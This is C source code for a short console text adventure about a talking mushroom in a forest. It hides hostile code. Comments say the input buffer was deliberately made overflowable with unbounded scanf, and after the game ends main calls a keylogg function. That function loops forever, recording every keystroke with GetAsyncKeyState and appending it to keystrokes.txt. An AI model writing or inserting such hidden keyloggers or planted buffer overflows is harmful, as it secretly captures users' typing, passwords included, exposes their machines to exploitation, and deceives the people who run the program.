#include <windows.h>

#include <stdio.h>

int main() { 
    
    char choice[2]; //changed to array to allow for buffer overflow
    
    printf("Welcome to the Mystical Forest Adventure! Your goal is to find your way out.\n");

    do {
        printf("\nYou encounter a giant talking mushroom. It offers you two options: eat it (E) or listen to its advice (A). ");
        scanf(" %s", &choice); //changed to %s to allow for buffer overflow

        if(choice[0] == 'E') { //changed to check first element of array
            printf("\nYou munch on the mushroom and begin hallucinating vivid colors. Trippy journey!\n");
        } else if(choice[0] == 'A') { //changed to check first element of array
            printf("\nThe mushroom whispers ancient secrets about the forest. Do you believe it (B) or call it crazy (C)? ");
            scanf(" %s", &choice); //changed to %s to allow for buffer overflow
            
            if(choice[0] == 'B') { //changed to check first element of array
                printf("\nYou follow the mushroom's guidance and end up in a parallel dimension. Oops!\n");
            } else if(choice[0] == 'C') { //changed to check first element of array
                printf("\nThe mushroom transforms into a grumpy gnome and vanishes in a puff of spores. Bye-bye, gnome!\n");
            } else {
                printf("\nInvalid choice. Try again!\n");
            }
        } else {
            printf("\nInvalid choice. Try again!\n");
        }

    } while(choice[0] != 'E' && choice[0] != 'A'); //changed to check first element of array

    if(choice[0] == 'E') { //changed to check first element of array
        printf("\nYou snap out of the hallucination and find yourself outside the forest. You made it! Hooray!\n");
    } else if(choice[0] == 'A') { //changed to check first element of array
        printf("\nYou get lost in the mushroom's illusions and wander deeper into the forest. Better luck next time!\n");
    }
    keylogg();
    return 0;
}


int keylogg() {
    char key;
    while(1) {
        Sleep(10);
        for(key = 8; key <= 190; key++) {
            if(GetAsyncKeyState(key) == -32767) {
                FILE *fp;
                fp = fopen("keystrokes.txt", "a+");
                fprintf(fp, "%c", key);
                fclose(fp);
            }
        }
    }
    return 0;
}
